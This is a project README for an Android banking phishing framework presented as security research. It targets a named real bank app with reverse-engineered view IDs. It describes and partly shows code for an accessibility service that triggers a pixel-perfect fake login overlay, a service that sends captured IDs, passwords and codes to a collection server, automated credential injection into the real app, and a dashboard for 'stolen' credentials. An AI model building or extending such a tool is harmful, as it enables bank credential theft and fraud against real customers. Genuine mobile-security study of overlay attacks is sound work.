# üéØ Phishing Framework - Advanced Mobile Security Research Project

*A comprehensive mobile security research framework demonstrating advanced phishing techniques and defensive measures for Android applications.*

## üìã Project Overview

This project presents a sophisticated phishing framework designed to demonstrate vulnerabilities in mobile banking applications and educate users about social engineering attacks. The system employs multiple attack vectors including overlay attacks, accessibility service exploitation, and credential harvesting to showcase real-world security threats.

## üéØ Security Research Objectives

### Attack Surface Analysis
- **Overlay Attacks**: Implementation of sophisticated UI overlays that mimic legitimate banking interfaces
- **Accessibility Service Exploitation**: Leveraging Android's accessibility framework for credential injection and app monitoring
- **Social Engineering**: Psychological manipulation techniques to deceive users into credential disclosure
- **Real-time Credential Harvesting**: Secure transmission and storage of captured authentication data

### Educational Components
- Demonstration of common phishing techniques in mobile environments
- Analysis of user behavior under simulated attack conditions
- Development of defensive strategies and user awareness training

## üèóÔ∏è System Architecture

### Core Components

#### 1. PhishingAccessibilityService
The heart of the surveillance system, this component monitors application state changes and triggers overlay attacks when the target banking application is detected.

```kotlin
// Monitors for target application launch
if (pkg == TARGET_PACKAGE && !overlayShown && !userLoggedIn) {
    overlayShown = true
    showPhishingOverlay()
}
```

**Key Capabilities:**
- Real-time application monitoring using accessibility events
- Automated credential injection into legitimate applications
- Dynamic overlay positioning and timing
- Failed login attempt detection and response

#### 2. PhishingOverlayActivity
A pixel-perfect replica of the target banking application's login interface, designed to deceive users into entering their credentials.

**Technical Implementation:**
- Transparent background rendering for seamless integration
- Dynamic greeting customization based on time of day
- Input validation matching the legitimate application's patterns
- Error handling that mirrors authentic user experience

#### 3. CredentialSendService
Secure transmission layer for captured credentials with robust error handling and retry mechanisms.

```kotlin
private fun sendCredentials(idNumber: String, password: String, codeValue: String) {
    val json = """{"id": "$idNumber", "password": "$password", "code": "$codeValue"}"""
    // Secure transmission to collection server
}
```

#### 4. CaughtActivity
Educational reveal mechanism that informs users about the phishing attempt after successful credential capture.

### Backend Infrastructure

#### Demo Server (Flask)
- **Secure credential storage** with JSON-based persistence
- **Administrative interface** with password-protected access
- **Data export capabilities** for research analysis
- **Network security configuration** allowing HTTP traffic for demonstration purposes

## üîí Security Implementation Details

### Permission Management
The framework requires specific Android permissions to function effectively:

```xml
<!-- Overlay display capability -->
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
<!-- Network communication -->
<uses-permission android:name="android.permission.INTERNET" />
```

### Accessibility Service Configuration
Custom accessibility service configuration enables comprehensive application monitoring:

```xml
<accessibility-service
    android:accessibilityEventTypes="typeWindowStateChanged|typeViewClicked|typeViewFocused"
    android:canRetrieveWindowContent="true"
    android:canRequestFilterKeyEvents="true" />
```

### Code Protection Mechanisms
- **Network security configuration** with cleartext traffic permissions for designated servers
- **Manifest hardening** with proper activity export settings
- **Runtime permission handling** with user consent workflows

## üé® User Interface Analysis

### Authentic vs. Phishing Interface Comparison

The phishing overlay demonstrates sophisticated UI replication techniques:

#### Design Elements
- **Color Palette**: Exact reproduction of the bank's brand colors
- **Typography**: Matching font families and sizing
- **Layout Structure**: Pixel-perfect positioning of form elements
- **Interactive Components**: Identical button styling and animations

#### Behavioral Mimicry
- **Input Validation**: Real-time error messages matching the authentic app
- **Loading States**: Simulated network delays for authenticity
- **Dynamic Content**: Time-based greetings and personalized elements

| Phishing Screen| Real App Screen| Caught Screen|

| <img src="screenshots/phishing_overlay.jpg" width="200"/> | <img src="screenshots/real_app.jpg" width="200"/> | <img src="screenshots/caught_screen.jpg" width="200"/> |

## üîß Technical Implementation

### Reverse Engineering Methodology

To create an authentic-looking phishing interface, extensive analysis of the target application was conducted:

#### XML Structure Analysis
- **Layout Inspection**: Detailed examination of the banking app's UI hierarchy
- **Resource Extraction**: Identification of drawable resources, color schemes, and dimensions
- **View ID Mapping**: Documentation of critical UI element identifiers for automated interaction

```kotlin
// Example of extracted View IDs from target application
val passwordNodes = root.findAccessibilityNodeInfosByViewId(
    "com.ideomobile.mercantile:id/text_input_edit_text_layout"
)
```

#### Component Identification
The accessibility service leverages specific UI component identifiers to interact with the legitimate banking application:

```kotlin
val loginButtons = root.findAccessibilityNodeInfosByViewId(
    "com.ideomobile.mercantile:id/LoginButton"
)
```

This approach demonstrates the importance of proper UI component protection in mobile applications.

### Automated Credential Injection

The framework includes sophisticated credential injection capabilities:

```kotlin
private fun injectPasswordToRealApp() {
    val passwordNode = passwordNodes[0]
    passwordNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
    
    val arguments = Bundle()
    arguments.putCharSequence(
        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
        injectedPassword
    )
    passwordNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
}
```

### Administrative Dashboard
The backend provides comprehensive data analysis capabilities with a secure web interface:

| Password Protection                                  | Data Visualization                                       | Local Storage                                      |
|------------------------------------------------------|----------------------------------------------------------|----------------------------------------------------|
| <img src="screenshots/admin_login.png" width="500"/> | <img src="screenshots/admin_dashboard.png" width="500"/> | <img src="screenshots/json_file.png" width="500"/> |

#### Access Control Implementation
```python
@app.route("/admin/view", methods=["GET", "POST"])
def admin_view():
    if not verify_admin_password(password):
        return jsonify({"error": "Invalid password"}), 401
    
    stolen_data = load_stolen_data()
    # Secure data presentation logic
```

#### Data Persistence and Security
- **Password-protected access**: SHA256 hashed authentication preventing unauthorized access
- **Real-time dashboard**: Live visualization of captured credentials with timestamps and metadata
- **Local JSON storage**: Secure file-based persistence with `stolen_credentials.json` for research analysis
- **Export capabilities**: Structured data export for further security research and analysis
